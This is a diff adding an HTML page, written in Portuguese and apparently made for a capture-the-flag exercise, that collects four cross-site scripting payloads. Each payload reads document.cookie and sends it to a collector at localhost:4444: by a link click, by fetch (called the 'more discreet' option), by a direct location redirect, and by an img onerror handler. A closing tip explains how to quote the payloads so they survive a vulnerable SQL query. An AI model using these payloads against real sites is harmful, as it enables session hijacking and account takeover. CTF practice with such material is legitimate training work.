@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Test Payload</title>
+</head>
+<body>
+
+<h2>Payload XSS para CTF - Versão Corrigida</h2>
+
+<h3>Opção 1: Payload Simples (sem aspas que quebrem SQL)</h3>
+<textarea rows="10" cols="80">
+<a id="send-cookie" href="#">Enviar cookie</a>
+<script>
+document.getElementById("send-cookie").addEventListener("click", function(e) {
+  e.preventDefault();
+  const cookieEncoded = encodeURIComponent(document.cookie);
+  window.location.href = "http://localhost:4444/debug-cookie?cookie=" + cookieEncoded;
+});
+</script>
+</textarea>
+
+<h3>Opção 2: Payload com Fetch (mais discreto)</h3>
+<textarea rows="8" cols="80">
+<script>
+fetch("http://localhost:4444/debug-cookie?cookie=" + encodeURIComponent(document.cookie))
+.catch(function(e){
+  console.log("Cookie enviado");
+});
+</script>
+</textarea>
+
+<h3>Opção 3: Payload Mínimo (para testar)</h3>
+<textarea rows="3" cols="80">
+<script>
+location="http://localhost:4444/debug-cookie?cookie="+document.cookie;
+</script>
+</textarea>
+
+<h3>Opção 4: Image Tag (funciona sempre)</h3>
+<textarea rows="3" cols="80">
+<img src="x" onerror="fetch('http://localhost:4444/debug-cookie?cookie='+encodeURIComponent(document.cookie))">
+</textarea>
+
+<p><strong>Dica:</strong> Use aspas duplas no JavaScript e aspas simples no HTML para evitar conflitos com a query SQL vulnerável.</p>
+
+</body>
+</html>
+</textarea>
